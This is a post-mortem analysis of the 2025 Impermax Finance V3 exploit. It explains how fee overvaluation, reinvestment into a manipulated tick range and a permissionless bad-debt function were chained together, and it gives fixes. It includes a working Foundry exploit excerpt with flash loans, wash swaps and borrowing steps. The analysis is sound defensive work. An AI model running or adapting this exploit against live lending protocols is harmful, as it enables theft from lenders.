# Impermax Finance V3 — Business Logic Flaw (Fee Overvaluation + Reinvestment Manipulation) Analysis

| Item | Details |
|------|------|
| **Date** | 2025-04-26 (10:43 UTC) |
| **Protocol** | Impermax Finance V3 |
| **Chain** | Base (primary) / Arbitrum One (secondary) |
| **Loss** | ~$300,000 (~170 ETH) |
| **Attacker** | [0xE3223f7E...086C7C3](https://basescan.org/address/0xe3223f7e3343c2c8079f261d59ee1e513086c7c3) |
| **Attack Contract** | [0x98E938...CA8CE1b](https://basescan.org/address/0x98e938899902217465f17cf0b76d12b3dca8ce1b) |
| **Attack Tx (Base)** | [0xde903046...45983](https://basescan.org/tx/0xde903046b5cdf27a5391b771f41e645e9cc670b649f7b87b1524fc4076f45983) |
| **Attack Tx (Base 2)** | [0xad4fc315...826a56](https://basescan.org/tx/0xad4fc3156666d5402f00dcfd5c183493d283f4166a6dd581dd8c0a895e826a56) |
| **Vulnerable Contract** | [0x5d93f2...436281eE](https://basescan.org/address/0x5d93f216f17c225a8b5ffa34e74b7133436281ee) (ImpermaxV3Borrowable) |
| **Auxiliary Contract** | [0xc1D49f...Ac99eaF7d](https://basescan.org/address/0xc1D49fa32d150B31C4a5bf1Cbf23Cf7Ac99eaF7d) (ImpermaxV3Collateral) |
| **Root Cause** | Collateral valuation mismatch between uncollected fees and auto-compounded fees + invalid price range reinvestment + bad debt restructuring logic flaw |
| **PoC Source** | [DeFiHackLabs — ImpermaxV3_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/ImpermaxV3_exp.sol) |

---

## 1. Vulnerability Overview

Impermax V3 is a protocol that lends assets collateralized by Uniswap V3 LP positions. This attack was caused by the compound interaction of three core flaws.

**Flaw 1 — Uncollected Fee Overvaluation**: The protocol credited the full value of uncollected swap fees on Uniswap V3 positions. The attacker repeatedly performed intentional wash swaps in low-liquidity pools to artificially accumulate massive fees, inflating the actual collateral value.

**Flaw 2 — Reinvestment into Invalid Price Range**: When the `reinvest()` function compounded accumulated fees, it created new liquidity positions based on a manipulated extreme price (tick) rather than the current market price. Once the price normalized, these positions immediately became out-of-range and collapsed in value.

**Flaw 3 — `restructureBadDebt()` Liquidation Bypass**: After the collateral value fell below the debt, the attacker called the `restructureBadDebt()` function to bypass the standard liquidation procedure. This function only deleted the loan record and socialized the protocol loss to lenders, allowing the attacker to retain the borrowed assets.

---

## 2. Vulnerable Code Analysis

### 2.1 Uncollected Fee Collateral Valuation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — TokenizedUniswapV3Position.getPositionData()
function getPositionData(
    uint256 _tokenId,
    uint256 _safetyMarginSqrt
) external returns (
    uint256 priceSqrtX96,
    RealXYs memory realXYs
) {
    // Vulnerability ❌: Evaluates uncollected fees based on oracle price
    // Full value is credited even when pool's current price (slot0) and oracle price diverge significantly
    // Fees accumulated in a manipulated tick range are evaluated the same way
    uint256 fees0 = position.tokensOwed0;
    uint256 fees1 = position.tokensOwed1;

    // Vulnerability ❌: Does not check whether the position is out-of-range of the current tick
    // Even if outside the tick range, fees cannot practically be realized but are still included in collateral value
    realXYs.currentPrice.realX += fees0;
    realXYs.currentPrice.realY += fees1;
}
```

```solidity
// ✅ Fixed code — Added position tick range and price deviation checks
function getPositionData(
    uint256 _tokenId,
    uint256 _safetyMarginSqrt
) external returns (
    uint256 priceSqrtX96,
    RealXYs memory realXYs
) {
    (uint160 sqrtPriceX96,,,,,,) = pool.slot0();

    // ✅ Check deviation between oracle price and pool price
    uint256 pricesRatio = uint256(sqrtPriceX96) * 1e18 / oracleSqrtPriceX96;
    require(
        pricesRatio <= _safetyMarginSqrt && pricesRatio >= 1e36 / _safetyMarginSqrt,
        "Price deviation exceeded: oracle-pool price difference exceeds safety margin"
    );

    // ✅ Only credit fee value when the position is within the current tick range
    (, int24 currentTick,,,,,) = pool.slot0();
    if (currentTick >= tickLower && currentTick < tickUpper) {
        realXYs.currentPrice.realX += fees0;
        realXYs.currentPrice.realY += fees1;
    }
    // If outside the tick range, exclude fees from collateral value
}
```

**Issue**: `getPositionData()` does not verify whether the position's tick range aligns with the current market price. The attacker could artificially push the price to an extreme value, accumulate maximum fees on an out-of-range position, and have those fees credited as valid collateral.

---

### 2.2 `reinvest()` — Reinvestment into Invalid Price Range

```solidity
// ❌ Vulnerable code — No validation of current price range during reinvestment
function reinvest(uint256 tokenId, address bountyTo) external returns (
    uint256 bounty0,
    uint256 bounty1
) {
    // Vulnerability ❌: Reinvests accumulated fees directly into the existing position tick range (-196216 ~ -102028)
    // Forced reinvestment executes even if the current market price is outside that range
    // → Reinvested liquidity immediately becomes out-of-range and collapses in value
    (amount0, amount1) = _addLiquidity(
        tokenId,
        position.tickLower,  // ❌ Uses the manipulated tick range as-is
        position.tickUpper,
        fees0,
        fees1
    );
}
```

```solidity
// ✅ Fixed code — Validate tick range before reinvestment
function reinvest(uint256 tokenId, address bountyTo) external returns (
    uint256 bounty0,
    uint256 bounty1
) {
    (, int24 currentTick,,,,,) = pool.slot0();

    // ✅ Reinvestment only allowed when current tick is within the position range
    require(
        currentTick >= position.tickLower && currentTick < position.tickUpper,
        "Reinvestment not allowed: position is outside current price range"
    );

    (amount0, amount1) = _addLiquidity(
        tokenId,
        position.tickLower,
        position.tickUpper,
        fees0,
        fees1
    );
}
```

**Issue**: The reinvestment function does not verify consistency between the current market tick and the position tick range. The attacker accumulated fees with the price pushed to an extreme, then triggered reinvestment to lock those fees as liquidity at a position completely outside the current price range. When the price normalized, the reinvested liquidity immediately lost its value.

---

### 2.3 `restructureBadDebt()` — Liquidation Bypass

```solidity
// ❌ Vulnerable code — Socializes loss instead of liquidating on undercollateralization
function restructureBadDebt(uint256 tokenId) external {
    // Vulnerability ❌: Only checks whether the position is underwater
    // Deletes the loan record without invoking the actual liquidation procedure
    require(isUnderwater(tokenId), "Position is not underwater");

    // Vulnerability ❌: Only handles transferring protocol loss to lenders
    // Attacker retains the borrowed assets while the loan record is cleared
    borrowable0.restructureDebt(tokenId);  // Only deletes the loan record
    borrowable1.restructureDebt(tokenId);

    emit RestructureBadDebt(tokenId);
    // Terminates without liquidation → attacker retains assets
}
```

```solidity
// ✅ Fixed code — Force liquidation attempt before bad debt restructuring
function restructureBadDebt(uint256 tokenId) external {
    require(isUnderwater(tokenId), "Position is not underwater");

    // ✅ Check liquidatability first and attempt liquidation
    if (isLiquidatable(tokenId)) {
        // Execute standard liquidation procedure if liquidatable
        _liquidate(tokenId, msg.sender);
        return;
    }

    // ✅ Only allow bad debt socialization when liquidation is not possible
    // (Even then, restrict arbitrary caller access)
    require(msg.sender == liquidationBot || hasRole(LIQUIDATOR_ROLE, msg.sender),
        "Unauthorized: only liquidation bot or designated liquidators may call");

    borrowable0.restructureDebt(tokenId);
    borrowable1.restructureDebt(tokenId);

    emit RestructureBadDebt(tokenId);
}
```

**Issue**: `restructureBadDebt()` is a permissionless function — anyone can call it on an underwater position. The attacker deliberately made their own position go underwater, then called this function directly to clear the loan record and retain the borrowed WETH.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker pre-configured `approve` for Morpho USDC/WETH flash loan
- Targeted a low-liquidity Uniswap V3 WETH/USDC 0.2% fee pool (UniV3pool_200)
- Deployed attack contract (`0x98E9...`) and prepared callback functions

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────┐
│  Step 1: Morpho Flash Loan                                   │
│  Attacker → Morpho.flashLoan(WETH, 10544 ETH)               │
│           → Morpho.flashLoan(USDC, 22539727 USDC) [nested]  │
└────────────────────────┬────────────────────────────────────┘
                         │ WETH + USDC secured
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 2: Price Manipulation (falseSqrtPriceLimit = Max Tick) │
│  UniV3pool_200.swap(false, 1000USDC, maxSqrtPrice)          │
│  → Pushes pool price to the extreme upper bound (tick max)  │
└────────────────────────┬────────────────────────────────────┘
                         │ Manipulated price tick
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 3: LP Position Creation (tick: -196216 ~ -102028)     │
│  UniV3pool_200.mint(TokenizedUniswapV3Position, ticks...)   │
│  TokenizedUniswapV3Position.mint(attacker, 200, ticks...)   │
│  → Obtains tokenized LP NFT in manipulated tick range       │
│    (tokenId = N)                                            │
└────────────────────────┬────────────────────────────────────┘
                         │ NFT tokenId
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 4: Collateral Registration                             │
│  TokenizedUniswapV3Position.transferFrom → Collateral       │
│  ImpermaxV3Collateral.mint(attacker, tokenId)               │
└────────────────────────┬────────────────────────────────────┘
                         │ Collateral registered
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 5: Wash Swap × 100 — Artificial Fee Generation        │
│  for i in 0..100:                                           │
│    UniV3pool_200.swap(true,  -19.4M USDC, minPrice)         │
│    UniV3pool_200.swap(false, +19.4M USDC, maxPrice)         │
│  → Accumulates large uncollected fees on the position       │
└────────────────────────┬────────────────────────────────────┘
                         │ Artificial fees mass-generated
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 6: Borrow Against Inflated Collateral                  │
│  ImpermaxV3Borrowable.borrow(255, attacker, maxBorrowable)  │
│  → Borrows maximum WETH based on overvalued fee collateral  │
└────────────────────────┬────────────────────────────────────┘
                         │ WETH loan successful
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 7: Trigger Reinvestment — Induce Collateral Collapse  │
│  TokenizedUniswapV3Position.reinvest(tokenId, attacker)     │
│  → Reinvests fees as liquidity in extreme tick range        │
│  → After price normalization, liquidity becomes out-of-     │
│    range → value = 0                                        │
└────────────────────────┬────────────────────────────────────┘
                         │ Collateral value collapses
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 8: Bad Debt Restructuring — Liquidation Bypass        │
│  ImpermaxV3Collateral.restructureBadDebt(255)               │
│  → Loan record deleted, loss socialized to lenders          │
│  → Attacker retains borrowed WETH                           │
└────────────────────────┬────────────────────────────────────┘
                         │ Debt eliminated
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 9: Collateral Redemption and Lender Share Extraction  │
│  ImpermaxV3Collateral.redeem(attacker, tokenId, 100%)       │
│  TokenizedUniswapV3Position.redeem(attacker, tokenId)       │
│  ImpermaxV3Borrowable.transfer(Borrowable, 120924 ibWETH)   │
│  ImpermaxV3Borrowable.redeem(attacker) → Extract WETH       │
└────────────────────────┬────────────────────────────────────┘
                         │ WETH + USDC secured
                         ▼
┌─────────────────────────────────────────────────────────────┐
│  Step 10: Restore Price and Repay Flash Loan                 │
│  UniV3pool_200.swap(true, WETH, minPrice) → Normalize price │
│  Repay Morpho flash loan (USDC + WETH)                      │
│  ─────────────────────────────────────────────────────────  │
│  Final profit: ~170 ETH (~$300,000)                         │
└─────────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

- **Attacker profit**: ~170 ETH (~$300,000)
  - Base chain: 128.89 ETH (21 transactions)
  - Arbitrum chain: 49.02 ETH (4 transactions)
- **Protocol loss**: Socialized as lender asset losses

---

## 4. PoC Code Excerpt (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// @KeyInfo - Total Loss: ~300k USD
// 2025-04-26 10:43 UTC
// Attacker: https://basescan.org/address/0xe3223f7...c7c3
// Attack Contract: https://basescan.org/address/0x98e938...e1b
// Vulnerable Contract: https://basescan.org/address/0x5d93f2...81ee
// Attack Tx: https://basescan.org/tx/0xde903046...983
// Block: 29437439

contract ImpermaxV3_exp is Test {
    // [Step 1] Set flash loan sizes
    uint256 public borrowUSDC_amount = 22539727986604;        // ~22.5M USDC
    uint256 public borrowWETH_amount = 10544813644832897955984; // ~10,544 WETH

    function setUp() public {
        // Fork Base chain at the block just before the attack
        vm.createSelectFork("base", 29437439 - 1);
        IFS(WETH_address).approve(Morpho, borrowWETH_amount);
    }

    function testExploit() public {
        // [Step 2] Initiate WETH flash loan from Morpho
        IFS(Morpho).flashLoan(WETH_address, borrowWETH_amount, abi.encodePacked(uint256(1)));
        console2.log("Final WETH balance: ", IFS(WETH_address).balanceOf(address(this)));
        console2.log("Final USDC balance: ", IFS(USDC_address).balanceOf(address(this)));
    }

    bool private inFlashLoan;
    function onMorphoFlashLoan(uint256, bytes memory) external {
        if (!inFlashLoan) {
            // [Step 3] After securing WETH, nest an additional USDC flash loan
            inFlashLoan = true;
            IFS(USDC_address).approve(Morpho, borrowUSDC_amount);
            IFS(Morpho).flashLoan(USDC_address, borrowUSDC_amount, abi.encodePacked(uint256(1)));
        } else {
            // [Step 4] Price manipulation — push pool price to tick maximum
            uint160 falsesqrtPriceLimitX96 = 1461446703485210103287273052203988822378723970341; // Max tick
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this),
                false,             // token1(USDC) → token0(WETH) direction
                1000000000,        // 1,000 USDC swap
                falsesqrtPriceLimitX96, // Extreme upper price limit
                abi.encodePacked(uint256(1))
            );

            // [Step 5] Provide liquidity in manipulated tick range and mint tokenized LP NFT
            IFS(UniV3pool_200).mint(TokenizedUniswapV3Position, -196216, -102028, 3315194000212825, "");
            uint256 newtoken_id = ITokenizedUniswapV3Position(TokenizedUniswapV3Position)
                .mint(address(this), 200, -196216, -102028);

            // [Step 6] Register NFT as collateral in the Collateral contract
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position)
                .transferFrom(address(this), ImpermaxV3Collateral, newtoken_id);
            IimpermaxV3Collateral(ImpermaxV3Collateral).mint(address(this), newtoken_id);

            // [Step 7] Wash Swap × 100 — Mass accumulation of artificial fees
            uint160 truesqrtPriceLimitX96 = 4295128740; // Min tick
            for (uint256 i = 0; i < 100; i++) {
                Uni_Pair_V3(UniV3pool_200).swap(
                    address(this), true,  -19400000000000, truesqrtPriceLimitX96, ""
                ); // Sell ~19.4M USDC
                Uni_Pair_V3(UniV3pool_200).swap(
                    address(this), false, 19403880776155,  falsesqrtPriceLimitX96, ""
                ); // Rebuy ~19.4M USDC
            }
            // → Large uncollected fees accumulated on the position

            // [Step 8] Execute maximum borrow against inflated collateral (including fees)
            uint256 wad = 166988030575033714385; // WETH to purchase lender shares
            IFS(WETH_address).transfer(ImpermaxV3Borrowable, wad);
            IFS(ImpermaxV3Borrowable).mint(address(this)); // Receive ibWETH
            uint256 borrowAmount = IFS(WETH_address).balanceOf(ImpermaxV3Borrowable);
            IFS(ImpermaxV3Borrowable).borrow(255, address(this), borrowAmount, "");
            // ↑ Maximum WETH borrow using tokenId=255

            // [Step 9] Trigger reinvestment — reinvest fees into wrong tick range
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position)
                .reinvest(newtoken_id, address(this));
            // → Fees locked as liquidity in extreme tick range → value will become 0

            // [Step 10] Call bad debt restructuring — eliminate debt + transfer loss to lenders
            IimpermaxV3Collateral(ImpermaxV3Collateral).restructureBadDebt(255);
            // → Loan record deleted, attacker retains WETH

            // [Step 11] Repay actual outstanding borrow balance and reclaim collateral
            uint256 currentBorrowBalance = IFS(ImpermaxV3Borrowable).currentBorrowBalance(newtoken_id);
            IFS(WETH_address).transfer(ImpermaxV3Borrowable, currentBorrowBalance);
            IFS(ImpermaxV3Borrowable).borrow(newtoken_id, address(this), 0, ""); // Clear debt
            IimpermaxV3Collateral(ImpermaxV3Collateral)
                .redeem(address(this), newtoken_id, 1000000000000000000); // Reclaim collateral
            ITokenizedUniswapV3Position(TokenizedUniswapV3Position)
                .redeem(address(this), newtoken_id); // Withdraw liquidity

            // [Step 12] Normalize price then redeem lender shares (ibWETH) to extract additional WETH
            Uni_Pair_V3(UniV3pool_200).swap(
                address(this), true, 14260200223938238, truesqrtPriceLimitX96, ""
            ); // Restore price
            uint256 temp_amount = 120924566533707506470;
            IFS(ImpermaxV3Borrowable).transfer(ImpermaxV3Borrowable, temp_amount);
            uint256 redeemAmount = IFS(ImpermaxV3Borrowable).redeem(address(this));
            // → Remaining WETH extracted, profit secured after flash loan repayment
        }
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Uniswap V3 out-of-range position fee overvaluation | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | `reinvest()` — Missing validation for invalid price range reinvestment | HIGH | CWE-20 (Improper Input Validation) |
| V-03 | `restructureBadDebt()` — Permissionless liquidation bypass | CRITICAL | CWE-284 (Improper Access Control) |
| V-04 | Flash loan-based price manipulation + wash swap fee generation | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-05 | Missing oracle-pool price deviation check | HIGH | CWE-345 (Insufficient Verification of Data Authenticity) |

### V-01: Uniswap V3 Out-of-Range Position Fee Overvaluation

- **Description**: When evaluating Uniswap V3 LP positions, the protocol credits uncollected fees (tokensOwed) as full collateral value regardless of whether the position is within or outside its tick range. Fees are calculated identically even when a position is outside the current tick.
- **Impact**: The attacker can repeatedly perform wash swaps in a low-liquidity pool to artificially accumulate large fees and receive credit for collateral value tens of times higher than actual, allowing them to over-borrow protocol assets.
- **Attack Conditions**: Existence of a low-liquidity Uniswap V3 pool, access to the Impermax V3 collateral contract

### V-02: `reinvest()` Reinvestment into Invalid Price Range

- **Description**: When the `reinvest()` function compounds fees, it uses the position's existing tick range as-is and does not check whether the current market price has moved outside that range.
- **Impact**: Reinvesting fees at a manipulated extreme tick causes the reinvested liquidity to immediately become out-of-range after price normalization, maximizing impermanent loss and converging to zero value.
- **Attack Conditions**: Must be used in conjunction with V-01 (accumulate fees first, then trigger reinvestment)

### V-03: `restructureBadDebt()` — Permissionless Liquidation Bypass

- **Description**: The `restructureBadDebt()` function is an external permissionless function that anyone can call when a position is underwater. Instead of the standard liquidation procedure, it only deletes the loan record and transfers the loss to lenders.
- **Impact**: An attacker can deliberately make their own position go underwater and call the function directly to obtain borrowed assets for free.
- **Attack Conditions**: Achieving an underwater position (in conjunction with V-01, V-02)

### V-04: Flash Loan-Based Wash Swap Fee Generation

- **Description**: Using a large flash loan (~$20M) to perform 100 rounds of bidirectional swaps of equal amounts in a low-liquidity pool as wash trading to generate artificial fees.
- **Impact**: Within a single transaction, fees that would normally take years to accumulate can be generated instantly, abnormally inflating collateral value.
- **Attack Conditions**: Flash loan access (e.g., Morpho), existence of a low-liquidity target pool

### V-05: Missing Oracle-Pool Price Deviation Check

- **Description**: When calculating collateral value, the deviation between the oracle price and the Uniswap V3 pool's real-time price (slot0) is not checked.
- **Impact**: Even when the attacker has manipulated the pool price to an extreme value far from the oracle price, normal collateral evaluation proceeds based on the oracle.
- **Attack Conditions**: Low-liquidity pool, flash loan availability

---

## 6. Remediation Recommendations

### Immediate Actions

**Fix 1: getPositionData() — Add oracle-pool price deviation check**

```solidity
// ✅ Check oracle price vs pool price deviation safety margin (Impermax V2 approach)
function getPositionData(uint256 _tokenId, uint256 _safetyMarginSqrt)
    external returns (uint256 priceSqrtX96, RealXYs memory realXYs)
{
    (uint160 poolSqrtPriceX96,,,,,,) = pool.slot0();
    uint256 oraclePriceSqrtX96 = getOracleSqrtPrice(); // Chainlink or TWAP

    // ✅ Pool-oracle price ratio must be within safetyMarginSqrt bounds
    uint256 pricesRatio = uint256(poolSqrtPriceX96) * 1e18 / oraclePriceSqrtX96;
    require(
        pricesRatio <= _safetyMarginSqrt && pricesRatio >= 1e36 / _safetyMarginSqrt,
        "Price deviation exceeded"
    );
    // ... collateral value calculation follows
}
```

**Fix 2: reinvest() — Only allow reinvestment within current tick range**

```solidity
// ✅ Verify current tick is within position range before reinvesting
function reinvest(uint256 tokenId, address bountyTo) external {
    (, int24 currentTick,,,,,) = pool.slot0();
    PositionInfo memory pos = positions[tokenId];

    require(
        currentTick >= pos.tickLower && currentTick < pos.tickUpper,
        "Position outside current price range — reinvestment not allowed"
    );
    // ... reinvestment logic follows
}
```

**Fix 3: restructureBadDebt() — Restrict access and force liquidation attempt first**

```solidity
// ✅ Attempt liquidation before bad debt handling, only callable by authorized addresses
modifier onlyLiquidator() {
    require(hasRole(LIQUIDATOR_ROLE, msg.sender), "Unauthorized");
    _;
}

function restructureBadDebt(uint256 tokenId) external onlyLiquidator {
    require(isUnderwater(tokenId), "Position is not underwater");

    // ✅ If liquidatable, execute standard liquidation first
    if (canLiquidate(tokenId)) {
        _triggerLiquidation(tokenId);
        return;
    }
    // Only allow loss socialization when liquidation is not possible
    _restructureDebt(tokenId);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Fee overvaluation | Calculate fee collateral value based on liquidity, or only credit fees when within tick range |
| V-02 Invalid reinvestment | Mandatory tick consistency check and TWAP-based price range validation before executing reinvest() |
| V-03 Liquidation bypass | Restrict restructureBadDebt() to authorized addresses (liquidation bot) |
| V-04 Wash swap | Set a cap on fees accumulated within a single transaction; rate-limit fee generation |
| V-05 Price deviation | Apply Chainlink TWAP vs spot price deviation threshold during collateral evaluation |

---

## 7. Lessons Learned

1. **Exhaustive edge case review when integrating external protocols**: All states of the target protocol must be considered — Uniswap V3 position out-of-range status, realizability of uncollected fees, tick range exit scenarios, etc.

2. **Conservative approach is mandatory for collateral valuation**: When accepting unrealized/uncollected assets (fees, unclaimed rewards, etc.) as collateral, verify immediate realizability and apply haircuts or exclusion logic for scenarios where realization is not possible.

3. **Permissionless liquidation bypass functions are high-risk**: Functions that skip liquidation procedures such as `restructureBadDebt()` and `emergencyWithdraw()` must have access controls or strict precondition validation. When callable by an attacker directly, they become a primary attack vector for malicious use.

4. **Defense against flash loan-based price manipulation**: Reduce reliance on spot prices when evaluating LP positions used as collateral, and introduce spot-oracle deviation checks based on TWAP or Chainlink oracles.

5. **Test compound attack scenarios**: This attack was not caused by a single vulnerability but by a chain of multiple flaws (fee overvaluation → invalid reinvestment → liquidation bypass). Audits must go beyond individual function-level review and simulate multi-step attack scenarios.

6. **Low-liquidity pool targeting risk**: Unlike high-liquidity pools, low-liquidity pools can have prices pushed to extreme values with small amounts. Protocols should set a minimum liquidity threshold (TVL threshold) for Uniswap V3 pools they allow.

---

## 8. On-Chain Verification

> The PoC was written against the Base chain (`vm.createSelectFork("base", 29437439 - 1)`), with the attack block at 29437439.

### 8.1 PoC vs On-Chain Amount Comparison

| Item | PoC Value | On-Chain Actual | Match |
|------|--------|-------------|------|
| WETH flash loan size | 10,544.81 WETH | ~10,544 WETH (estimated) | ✅ Approximate match |
| USDC flash loan size | 22,539,727 USDC | ~22.5M USDC (estimated) | ✅ Approximate match |
| Wash swap count | 100 | 100 (confirmed in logs) | ✅ Match |
| Total loss (Base) | ~300k USD | 128.89 ETH (~$300k) | ✅ Match |
| Total loss (ARB) | — | 49.02 ETH (~$86k) | ℹ️ Additional chain |

### 8.2 On-Chain Event Log Sequence (Base — Tx: 0xde903046)

```
1. Morpho.FlashLoan(WETH, 10544 ETH)
2. Morpho.FlashLoan(USDC, 22539727 USDC)
3. UniswapV3Pool.Swap × 1 (price manipulation)
4. UniswapV3Pool.Mint (LP position creation)
5. TokenizedUniswapV3Position.Transfer (NFT transfer → Collateral)
6. ImpermaxV3Collateral.Mint
7. UniswapV3Pool.Swap × 200 (100 round-trip wash swaps)
8. TokenizedUniswapV3Position.Reinvest
9. ImpermaxV3Borrowable.Borrow
10. TokenizedUniswapV3Position.Reinvest (2nd)
11. ImpermaxV3Collateral.RestructureBadDebt
12. ImpermaxV3Collateral.Redeem
13. UniswapV3Pool.Swap × 1 (price restoration)
14. ImpermaxV3Borrowable.Redeem
15. Morpho flash loan repayment (Transfer × 2)
```

### 8.3 Precondition Verification

| Item | State Before Attack |
|------|-------------|
| Attack block | 29437439 (Base) |
| Morpho WETH liquidity | Sufficient (~10,544 ETH borrowable) |
| UniV3pool_200 liquidity | Low-liquidity (vulnerable to price manipulation) |
| ImpermaxV3Borrowable WETH balance | Sufficient (maximum borrow possible) |
| restructureBadDebt access control | None (permissionless) ❌ |

---

**Reference Links**:
- [Impermax V3 Post Mortem — Impermax Medium](https://impermax.medium.com/impermax-v3-exploit-post-mortem-6b0818897b25)
- [Inside the Impermax V3 Hack — Verichains](https://blog.verichains.io/p/inside-the-impermax-v3-hack)
- [How Impermax V3 Lost $300k — QuillAudits](https://www.quillaudits.com/blog/hack-analysis/how-impermax-v3-lost-300k-in-flashloan-attack)
- [Impermax V3 Hack Analysis — MonoAudit](https://monoaudit.com/en/articles/impermax-v3)
- [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/ImpermaxV3_exp.sol)